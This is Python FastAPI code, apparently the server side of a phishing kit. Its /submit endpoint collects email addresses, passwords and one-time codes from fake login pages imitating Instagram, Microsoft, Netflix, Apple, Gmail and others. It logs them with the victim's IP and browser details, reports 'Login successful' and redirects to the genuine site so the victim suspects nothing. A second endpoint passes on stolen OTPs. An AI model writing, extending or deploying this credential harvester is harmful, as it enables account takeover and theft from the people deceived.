@app.post("/submit")
async def submit_credentials(request: Request):
    """Handle form submission (email/password/OTP)"""
    data = await request.json()

    ip = get_client_ip(request)

    # Check rate limiting
    if check_rate_limit(ip):
        raise HTTPException(status_code=429, detail="Too many attempts. Try again later.")

    service = data.get("service", "generic").strip()
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()
    otp = data.get("otp", "").strip()
    honeypot = data.get("honeypot", "").strip()

    # Validate
    if not email:
        raise HTTPException(status_code=400, detail="Missing email")

    # Check honeypot (should be empty)
    if honeypot:
        log_capture(service, email, password, otp, honeypot, ip, request.headers.get("user-agent", ""), request.headers.get("referer", ""))
        return {"success": True, "redirect": "https://www.google.com"}

    # Log the capture
    log_capture(
        service,
        email,
        password,
        otp,
        honeypot,
        ip,
        request.headers.get("user-agent", ""),
        request.headers.get("referer", "")
    )

    # Return success with redirect
    redirects = {
        "instagram": "https://www.instagram.com",
        "microsoft": "https://www.microsoft.com",
        "facebook": "https://www.facebook.com",
        "netflix": "https://www.netflix.com",
        "snapchat": "https://www.snapchat.com",
        "twitter": "https://www.twitter.com",
        "linkedin": "https://www.linkedin.com",
        "amazon": "https://www.amazon.com",
        "apple": "https://www.apple.com",
        "gmail": "https://www.gmail.com"
    }

    return {
        "success": True,
        "message": "Login successful",
        "redirect": redirects.get(service, "https://www.google.com")
    }

@app.post("/submit-otp")
async def submit_otp(request: Request):
    """Backward compatibility for old OTP endpoint"""
    data = await request.json()
    data["service"] = "otp"
    # Convert to new format
    if "otp" in data:
        data["otp"] = data.get("otp", "")
    return await submit_credentials(request)

